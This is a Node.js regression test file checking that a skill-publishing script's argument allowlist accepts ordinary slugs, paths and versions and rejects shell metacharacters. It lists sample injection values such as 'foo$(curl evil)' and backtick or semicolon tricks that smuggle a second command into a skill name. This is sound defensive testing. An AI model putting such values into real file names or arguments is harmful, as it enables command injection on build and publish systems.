#!/usr/bin/env node
// Regression tests for the publish-script argument allowlist (F-2).
// The script must be importable without publishing: require.main guard.

const test = require('node:test');
const assert = require('node:assert/strict');
const { assertSafeArg, displayName, quote } = require('../scripts/publish-openclaw-skills.js');

test('importing the publish script does not publish anything', () => {
  // The require above already proved it: no spawn happened, exports exist.
  assert.equal(typeof assertSafeArg, 'function');
});

test('repo-generated args pass the allowlist', () => {
  assert.equal(assertSafeArg('ponytail-review'), 'ponytail-review');
  assert.equal(assertSafeArg('.openclaw/skills/ponytail-review'), '.openclaw/skills/ponytail-review');
  assert.equal(assertSafeArg('Ponytail Review'), 'Ponytail Review');
  assert.equal(assertSafeArg('5.3.2'), '5.3.2');
  assert.equal(assertSafeArg('--dry-run'), '--dry-run');
});

test('shell metacharacters are refused before any shell runs', () => {
  // A malicious PR could add a skill directory with any of these in its name;
  // double quoting does not stop them in POSIX sh or cmd.exe.
  for (const evil of [
    'foo$(curl evil)',
    'foo`id`',
    'x%PATH%',
    'semi;colon',
    'amp&&and',
    'pipe|pipe',
    'redir>out',
    "quote'in",
  ]) {
    assert.throws(() => assertSafeArg(evil), /shell metacharacters/, evil);
  }
});

test('quote still wraps only space-bearing args for display', () => {
  assert.equal(quote('ponytail'), 'ponytail');
  assert.equal(quote('Ponytail Review'), '"Ponytail Review"');
});

test('displayName maps slugs the way the publish loop expects', () => {
  assert.equal(displayName('ponytail-review'), 'Ponytail Review');
});
